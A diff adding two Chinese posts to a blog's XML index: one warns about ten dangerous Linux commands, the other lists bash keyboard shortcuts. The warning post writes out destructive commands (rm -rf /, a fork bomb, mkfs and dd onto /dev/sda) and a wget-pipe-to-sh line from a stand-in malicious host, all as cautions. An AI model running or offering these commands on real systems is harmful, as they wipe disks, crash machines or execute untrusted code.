@@ -4,6 +4,56 @@
   
     
     <entry>
+      <title>Linux 10个危险的命令</title>
+      <link href="/2024/07/28/fourteen/"/>
+      <url>/2024/07/28/fourteen/</url>
+      
+        <content type="html"><![CDATA[<p>Linux命令行佷有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正在做什么时候。<br>这篇文章将会向你介绍十条命令，但你最好不要尝试着去使用。<br>当然，以下命令通常都是在root权限下才能将愚蠢发挥到无可救药；在普通用户身份下，破坏的只是自己的一亩三分地。</p><h1 id="rm-rf-命令"><a href="#rm-rf-命令" class="headerlink" title="rm -rf 命令"></a>rm -rf 命令</h1><p>rm -rf命令是删除文件夹及其内容最快的方式之一。<br>仅仅一丁点的敲错或无知都可能导致不可恢复的系统崩坏。<br>下列是一些rm 命令的选项：<br>    • rm　命令在Linux下通常用来删除文件。<br>    • rm -r 命令递归的删除文件夹，甚至是空的文件夹<br>    • rm -f 命令能不经过询问直接删除‘只读文件’。Linux下删除文件并不在乎该文件是否是只读的，而只是在意其父目录是否有写权限。所以，-f这个参数只是表示不必一个个删除确认，而是一律悄悄删除。另外，原始的rm命令其实也是没有删除提示的，只是一般的发行版都会将rm通过别名的方式增加-i参数来要求删除确认，而-f则抑制了这个提示。<br>    • rm -rf / : 强制删除根目录下所有东东。<br>    • rm -rf *:　强制删除当前目录的所有文件。<br>    • rm -rf . : 强制删除当前文件夹及其子文件夹。<br>从现在起，当你要执行rm -rf命令时请留心一点。我们可以在“.bashrc”文件对‘rm‘命令创建rm -i的别名，来预防用 ‘rm‘命令删除文件时的事故，它会要求你确认每一个删除请求。（译注：大多数发行版已经这样做了，如果还没有，请这样做，并在使用-f参数前一定考虑好你在做什么！译者本人有着血泪的教训啊。）</p><h1 id="amp-命令"><a href="#amp-命令" class="headerlink" title=":(){:|:&amp;};: 命令"></a>:(){:|:&amp;};: 命令</h1><p>这就是个fork 炸弹的实例。<br>具体操作是通过定义一个名为 ‘:‘的函数，它会调用自己两次，一次在前台另一次运行在后台。它会反复的执行下去直到系统崩溃。</p><h1 id="命令-gt-dev-sda"><a href="#命令-gt-dev-sda" class="headerlink" title="命令　&gt; /dev/sda"></a>命令　&gt; /dev/sda</h1><p>这个命令会将某个‘命令‘的输出写到块设备/dev/sda中。<br>该操作会将在块设备中的所有数据块替换为命令写入的原始数据，从而导致整个块设备的数据丢失。</p><h1 id="mv-文件夹-dev-null"><a href="#mv-文件夹-dev-null" class="headerlink" title="mv 文件夹 /dev/null"></a>mv 文件夹 /dev/null</h1><p>这个命令会移动某个‘文件夹‘到/dev/null。<br>在Linux中 /dev/null 或 null 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。<br>当然，要说明的是这个命令并不能阻止数据恢复软件——所以，真正的彻底毁灭，需要采用专用的软件或者手法来完成。</p><h1 id="wget-http-malicious-source-O-sh"><a href="#wget-http-malicious-source-O-sh" class="headerlink" title="wget http://malicious_source -O- | sh"></a>wget <a href="http://malicious_source" target="_blank" rel="noopener">http://malicious_source</a> -O- | sh</h1><p>该命令会从一个（也许是）恶意源下载一个脚本并执行。<br>Ｗget命令会下载这个脚本，而sh会（无条件的）执行下载下来的脚本。<br>注意: 你应该时刻注意你下载包或脚本的源。只能使用那些从可信任的源中下载脚本/程序。</p><h1 id="mkfs-ext3-dev-sda"><a href="#mkfs-ext3-dev-sda" class="headerlink" title="mkfs.ext3 /dev/sda"></a>mkfs.ext3 /dev/sda</h1><p>上列命令会格式化块设备‘sda’，在执行这个命令后你的块设备(硬盘驱动器)会被格式化，直接让你的系统达到不可恢复的阶段。<br>通常我们不会直接使用/dev/sda这样的设备，除非是作为raw设备使用。<br>一般都需要将sda分成类似sda1、sda2这样的分区后才使用。当然，无论你使用sda还是sda1，这样对块设备或分区进行mkfs都是毁灭性的，上面的数据都会被蒸发了。</p><h1 id="gt-file"><a href="#gt-file" class="headerlink" title="&gt; file"></a>&gt; file</h1><p>这个命令常用来清空文件内容或记录命令输出。<br>不过请在执行前，确认输出的文件是空的或者还不存在，否则原来的文件可真是恢复不了了——连数据恢复软件都未必能帮助你了。<br>你可能真正想用的是“&gt;&gt;”，即累加新的输出到文件，而不是刷新那个文件。<br>如果用上列执行时输入错误或无知的输入类似 “&gt; xt.conf”　的命令会覆盖配置文件或其他任何的系统配置文件。</p><h1 id="foo-bar"><a href="#foo-bar" class="headerlink" title="^foo^bar"></a>^foo^bar</h1><p>这个命令用来编辑先前运行的命令而无需重打整个命令。<br>用foobar命令时如果你没有彻底检查改变原始命令的风险，这可能导致真正的麻烦。</p><h1 id="dd-if-dev-random-of-dev-sda"><a href="#dd-if-dev-random-of-dev-sda" class="headerlink" title="dd if=/dev/random of=/dev/sda"></a>dd if=/dev/random of=/dev/sda</h1><p>这个命令会向块设备sda写入随机的垃圾文件从而擦出数据，让你的系统可能陷入混乱和不可恢复的状态。<br>记得上面说过mv到黑洞并不能彻底删除数据么？那么这个命令就是给了你一个彻底删除的方法！当然为了保险起见，你可以覆写多次。</p><h1 id="隐藏命令"><a href="#隐藏命令" class="headerlink" title="隐藏命令"></a>隐藏命令</h1><p>下面的命令其实就是上面第一个命令 (rm -rf)。<br>这里的代码是隐藏在十六进制里的,一个无知的用户可能就会被愚弄，如果在终端里运行下面命令可能会擦除你的根分区。<br>真正的危险是隐藏起来的，不会被轻易的检测到。你必须时刻留心你在做什么结果会怎样。<br>切记，千万不要编译／运行从未知来源的代码。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Linux </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Linux Shell一些快捷键</title>
+      <link href="/2024/07/28/thirteen/"/>
+      <url>/2024/07/28/thirteen/</url>
+      
+        <content type="html"><![CDATA[<p>ctrl+a:光标移到行首。<br>ctrl+e:光标移到行尾。<br>ctrl+b:光标左移一个字母, 向行首移动一个字符<br>ctrl+f:光标右移,向行尾移动一个字符<br>ctrl+c:杀死当前进程。<br>ctrl+d:退出当前 Shell,从Shell提示中注销并关闭，使用该快捷键就不必键入exit<br>ctrl+h:删除光标前一个字符，同 backspace 键相同。<br>ctrl+l:清屏，相当于clear。<br>ctrl+r:搜索之前打过的命令。会有一个提示，根据你输入的关键字进行搜索bash的history<br>ctrl+k:清除光标后至行尾的内容。<br>ctrl+u:清除光标前至行首间的所有内容。<br>ctrl+w:移除光标前的一个单词<br>ctrl+t:交换光标位置前的两个字符(包括光标所在的当前位置)<br>ctrl+y:粘贴或者恢复上次的删除<br>ctrl+d:删除光标所在字母;注意和backspace以及ctrl+h的区别，这2个是删除光标前的字符<br>ctrl+z:把当前进程转到后台运行，使用’ fg ‘命令恢复。比如top -d1<br>然后ctrl+z ，到后台，然后fg,重新恢复</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Linux </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Linux history 显示命令执行的时间</title>
       <link href="/2024/07/28/twleve/"/>
       <url>/2024/07/28/twleve/</url>
